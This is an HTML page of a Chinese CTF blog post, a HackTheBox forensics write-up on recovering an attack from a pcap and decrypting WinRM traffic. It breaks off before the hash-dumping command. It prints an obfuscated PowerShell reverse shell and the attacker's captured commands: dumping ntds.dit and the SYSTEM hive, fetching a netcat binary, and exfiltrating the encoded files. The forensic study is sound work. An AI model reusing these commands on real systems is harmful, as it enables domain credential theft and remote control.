@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="介绍本文内容来自于hackthebox的forensics challenge的Keep the steam going的题解方法">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从pcap包中解密Winrm流量">
+<meta property="og:url" content="https://fdlucifer.github.io/2022/01/05/decrypt-winrm-traffic/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="介绍本文内容来自于hackthebox的forensics challenge的Keep the steam going的题解方法">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic2.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic5.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic6.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic8.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic9.png">
+<meta property="article:published_time" content="2022-01-05T06:05:26.000Z">
+<meta property="article:modified_time" content="2022-01-05T08:33:53.558Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="forensics">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic.png">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2022/01/05/decrypt-winrm-traffic/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2022/01/05/decrypt-winrm-traffic/","path":"2022/01/05/decrypt-winrm-traffic/","title":"从pcap包中解密Winrm流量"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>从pcap包中解密Winrm流量 | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%86%E6%9E%90pcap%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="nav-number">2.</span> <span class="nav-text">分析pcap数据包</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#dump-NTLM-Hashes"><span class="nav-number">3.</span> <span class="nav-text">dump NTLM Hashes</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86winrm%E6%B5%81%E9%87%8F"><span class="nav-number">4.</span> <span class="nav-text">解密winrm流量</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86winrm%E6%B5%81%E9%87%8F%E5%B9%B6%E8%8E%B7%E5%8F%96%E6%9C%80%E5%90%8E%E7%9A%84flag"><span class="nav-number">5.</span> <span class="nav-text">解密winrm流量并获取最后的flag</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2022/01/05/decrypt-winrm-traffic/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="从pcap包中解密Winrm流量 | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从pcap包中解密Winrm流量
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2022-01-05 14:05:26 / Modified: 16:33:53" itemprop="dateCreated datePublished" datetime="2022-01-05T14:05:26+08:00">2022-01-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>本文内容来自于hackthebox的forensics challenge的Keep the steam going的题解方法</p>
+<span id="more"></span>
+
+<h1 id="分析pcap数据包"><a href="#分析pcap数据包" class="headerlink" title="分析pcap数据包"></a>分析pcap数据包</h1><p>使用”tcp.stream eq 20”在wireshark中过滤数据包，发现一个powershell写的reverse shell，并且混淆过</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sv (<span class="string">&#x27;8mxc&#x27;</span>+<span class="string">&#x27;p&#x27;</span>)  ([tyPe](<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span> -f <span class="string">&#x27;t.encOdi&#x27;</span>,<span class="string">&#x27;tex&#x27;</span>,<span class="string">&#x27;nG&#x27;</span>) ) ;<span class="variable">$&#123;ClI`E`Nt&#125;</span> = &amp;(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&#123;2&#125;&quot;</span>-f <span class="string">&#x27;je&#x27;</span>,<span class="string">&#x27;New-Ob&#x27;</span>,<span class="string">&#x27;ct&#x27;</span>) (<span class="string">&quot;&#123;5&#125;&#123;0&#125;&#123;8&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;&#123;4&#125;&#123;6&#125;&#123;7&#125;&quot;</span> -f<span class="string">&#x27;y&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;.Net.So&#x27;</span>,<span class="string">&#x27;ckets.T&#x27;</span>,<span class="string">&#x27;C&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;PC&#x27;</span>,<span class="string">&#x27;lient&#x27;</span>,<span class="string">&#x27;ste&#x27;</span>)((&quot;&#123;<span class="number">0</span>&#125;&#123;<span class="number">1</span>&#125;&#123;<span class="number">2</span>&#125;&quot; -f &#x27;<span class="number">192.168</span>&#x27;,&#x27;.<span class="number">1</span>&#x27;,&#x27;.<span class="number">9</span>&#x27;),<span class="number">4443</span>);<span class="variable">$&#123;sT`Re`Am&#125;</span> = <span class="variable">$&#123;C`L`IeNT&#125;</span>.(&quot;&#123;<span class="number">0</span>&#125;&#123;<span class="number">2</span>&#125;&#123;<span class="number">1</span>&#125;&quot;-f&#x27;Ge&#x27;,&#x27;tream&#x27;,&#x27;tS&#x27;).Invoke();[byte[]]<span class="variable">$&#123;By`T`es&#125;</span> = <span class="number">0</span>..<span class="number">65535</span>|.(&#x27;%&#x27;)&#123;<span class="number">0</span>&#125;;while((<span class="variable">$&#123;i&#125;</span> = <span class="variable">$&#123;str`EaM&#125;</span>.(&quot;&#123;<span class="number">0</span>&#125;&#123;<span class="number">1</span>&#125;&quot; -f&#x27;Re&#x27;,&#x27;ad&#x27;).Invoke(<span class="variable">$&#123;bY`Tes&#125;</span>, <span class="number">0</span>, <span class="variable">$&#123;by`TEs&#125;</span>.&quot;Len`G`TH&quot;)) -ne 0)&#123;;<span class="variable">$&#123;d`AtA&#125;</span> = (.(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span>-f <span class="string">&#x27;-Object&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="string">&#x27;Ne&#x27;</span>) -TypeName (<span class="string">&quot;&#123;0&#125;&#123;3&#125;&#123;5&#125;&#123;1&#125;&#123;4&#125;&#123;2&#125;&quot;</span> -f<span class="string">&#x27;Syst&#x27;</span>,<span class="string">&#x27;ASCI&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;em.Text&#x27;</span>,<span class="string">&#x27;IEncodin&#x27;</span>,<span class="string">&#x27;.&#x27;</span>)).<span class="string">&quot;gETSt`R`i`Ng&quot;</span>(<span class="variable">$&#123;by`TES&#125;</span>,0, <span class="variable">$&#123;i&#125;</span>);<span class="variable">$&#123;SeN`DBacK&#125;</span> = (.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span>-f <span class="string">&#x27;ie&#x27;</span>,<span class="string">&#x27;x&#x27;</span>) <span class="variable">$&#123;Da`Ta&#125;</span> 2&gt;&amp;1 | &amp;(<span class="string">&quot;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span>-f<span class="string">&#x27;Out-&#x27;</span>,<span class="string">&#x27;ing&#x27;</span>,<span class="string">&#x27;Str&#x27;</span>) );<span class="variable">$&#123;SENdb`AC`k2&#125;</span> = <span class="variable">$&#123;s`eNDb`ACK&#125;</span> + <span class="string">&quot;PS &quot;</span> + (.(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span>-f<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;pw&#x27;</span>)).<span class="string">&quot;P`ATH&quot;</span> + <span class="string">&quot;&gt; &quot;</span>;<span class="variable">$&#123;sE`NDBYtE&#125;</span> = (  (  vaRIaBle (<span class="string">&#x27;8MXC&#x27;</span>+<span class="string">&#x27;P&#x27;</span>)  -ValUe  )::<span class="string">&quot;ASC`Ii&quot;</span>).(<span class="string">&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;&quot;</span>-f<span class="string">&#x27;es&#x27;</span>,<span class="string">&#x27;tByt&#x27;</span>,<span class="string">&#x27;Ge&#x27;</span>).Invoke(<span class="variable">$&#123;SENdB`AC`K2&#125;</span>);<span class="variable">$&#123;sT`REAM&#125;</span>.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span> -f<span class="string">&#x27;Writ&#x27;</span>,<span class="string">&#x27;e&#x27;</span>).Invoke(<span class="variable">$&#123;S`e`NdbY`Te&#125;</span>,0,<span class="variable">$&#123;SE`NDbyTe&#125;</span>.<span class="string">&quot;lENG`TH&quot;</span>);<span class="variable">$&#123;S`TR`eAM&#125;</span>.(<span class="string">&quot;&#123;1&#125;&#123;0&#125;&quot;</span> -f <span class="string">&#x27;h&#x27;</span>,<span class="string">&#x27;Flus&#x27;</span>).Invoke()&#125;;<span class="variable">$&#123;clIE`Nt&#125;</span>.(<span class="string">&quot;&#123;0&#125;&#123;1&#125;&quot;</span>-f <span class="string">&#x27;Cl&#x27;</span>,<span class="string">&#x27;ose&#x27;</span>).Invoke()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic.png"></li>
+</ul>
+<p>使用”tcp.stream eq 21”在wireshark中过滤数据包，发现攻击者以smith用户获取reverse shell后，执行命令dump ntds.dit和SYSTEM hive文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; <span class="built_in">whoami</span>;hostname</span><br><span class="line">corp\asmith</span><br><span class="line">corp-dc</span><br><span class="line">PS C:\&gt; ntdsutil <span class="string">&quot;ac i ntds&quot;</span> <span class="string">&quot;ifm&quot;</span> <span class="string">&quot;create full c:\temp&quot;</span> q q</span><br><span class="line">C:\Windows\system32\ntdsutil.exe: ac i ntds</span><br><span class="line">Active instance <span class="built_in">set</span> to <span class="string">&quot;ntds&quot;</span>.</span><br><span class="line">C:\Windows\system32\ntdsutil.exe: ifm</span><br><span class="line">ifm: create full c:\temp</span><br><span class="line">Creating snapshot...</span><br><span class="line">Snapshot <span class="built_in">set</span> &#123;7f610e6f-46fe-4e74-9cc9-baa92f19f67a&#125; generated successfully.</span><br><span class="line">Snapshot &#123;710fb56f-b795-44ef-b88a-d25aa3026d36&#125; mounted as C:\$SNAP_202111051500_VOLUMEC$\</span><br><span class="line">Snapshot &#123;710fb56f-b795-44ef-b88a-d25aa3026d36&#125; is already mounted.</span><br><span class="line">Initiating DEFRAGMENTATION mode...</span><br><span class="line">     Source Database: C:\$SNAP_202111051500_VOLUMEC$\Windows\NTDS\ntds.dit</span><br><span class="line">     Target Database: c:\temp\Active Directory\ntds.dit</span><br><span class="line"></span><br><span class="line">                  Defragmentation  Status (omplete)</span><br><span class="line"></span><br><span class="line">          0    10   20   30   40   50   60   70   80   90  100</span><br><span class="line">          |----|----|----|----|----|----|----|----|----|----|</span><br><span class="line">          ...................................................</span><br><span class="line"></span><br><span class="line">Copying registry files...</span><br><span class="line">Copying c:\temp\registry\SYSTEM</span><br><span class="line">Copying c:\temp\registry\SECURITY</span><br><span class="line">Snapshot &#123;710fb56f-b795-44ef-b88a-d25aa3026d36&#125; unmounted.</span><br><span class="line">IFM media created successfully <span class="keyword">in</span> c:\temp</span><br><span class="line">ifm: q</span><br><span class="line">C:\Windows\system32\ntdsutil.exe: q</span><br><span class="line">PS C:\&gt; iex (New-Object System.Net.WebClient).DownloadFile(<span class="string">&quot;http://192.168.1.9/n.exe&quot;</span>,<span class="string">&quot;C:\Users\Public\Music\n.exe&quot;</span>)</span><br><span class="line">PS C:\&gt; certutil -encode <span class="string">&quot;C:\temp\Active Directory\ntds.dit&quot;</span> <span class="string">&quot;C:\temp\ntds.b64&quot;</span></span><br><span class="line">Input Length = 33554432</span><br><span class="line">Output Length = 46137402</span><br><span class="line">CertUtil: -encode <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\&gt; certutil -encode <span class="string">&quot;C:\temp\REGISTRY\SYSTEM&quot;</span> <span class="string">&quot;C:\temp\system.b64&quot;</span></span><br><span class="line">Input Length = 15204352</span><br><span class="line">Output Length = 20906044</span><br><span class="line">CertUtil: -encode <span class="built_in">command</span> completed successfully.</span><br><span class="line">PS C:\&gt; <span class="built_in">cat</span> C:\temp\ntds.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080</span><br><span class="line">PS C:\&gt; <span class="built_in">cat</span> C:\temp\system.b64 | C:\Users\Public\Music\n.exe 192.168.1.9 8080</span><br><span class="line">PS C:\&gt; </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic1.png"></li>
+</ul>
+<p>使用”tcp.stream eq 23”在wireshark中过滤数据包，发现攻击者使用netcat传输ntds.dit文件，并且经过了base64加密</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic2.png"></li>
+</ul>
+<p>保存为ntds.dit.b64，并去掉开头的”—–BEGIN CERTIFICATE—–”和结尾的”—–END CERTIFICATE—–”,然后使用下列命令解密还原为原文件</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic3.png"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># base64 --decode ntds.dit.b64 &gt; ntds.dit</span></span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># file ntds.dit     </span></span><br><span class="line">ntds.dit: Extensible storage engine DataBase, version 0x620, checksum 0xe3a0f73e, page size 8192, Windows version 10.0</span><br></pre></td></tr></table></figure>
+
+<p>使用”tcp.stream eq 24”在wireshark中过滤数据包，发现攻击者使用netcat传输system.hive文件，并且经过了base64加密</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic4.png"></li>
+</ul>
+<p>保存为system.b64，并去掉开头的”—–BEGIN CERTIFICATE—–”和结尾的”—–END CERTIFICATE—–”,然后使用下列命令解密还原为原文件</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/decrypt-winrm-traffic5.png"></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># base64 --decode system.b64 &gt; system.hive</span></span><br><span class="line">                                                                                                                                    </span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/forensics/forensics_keep_the_steam]</span><br><span class="line">└─<span class="comment"># file system.hive </span></span><br><span class="line">system.hive: MS Windows registry file, NT/2000 or above</span><br></pre></td></tr></table></figure>
+
+<h1 id="dump-NTLM-Hashes"><a href="#dump-NTLM-Hashes" class="headerlink" title="dump NTLM Hashes"></a>dump NTLM Hashes</h1><p>显然，ntds.dit和system.hive中都包含大量信息，所以决定把重点放在如果同时利用这两个文件，看看能得到什么。发现为了为域用户提取NTLM hash，从系统中获取这些文件是一种相当常见的策略。Impacket有一个名为secretsdump.py的脚本可以自动提取这些哈希值; Kali Linux已经有了这个脚本，但也可以从github直接下载它</p>
+<ul>
+<li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0L2Jsb2IvbWFzdGVyL2V4YW1wbGVzL3NlY3JldHNkdW1wLnB5">secretsdump.py<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p>dump hash的实际命令相对简单，就像解析results的过程一样:</p>
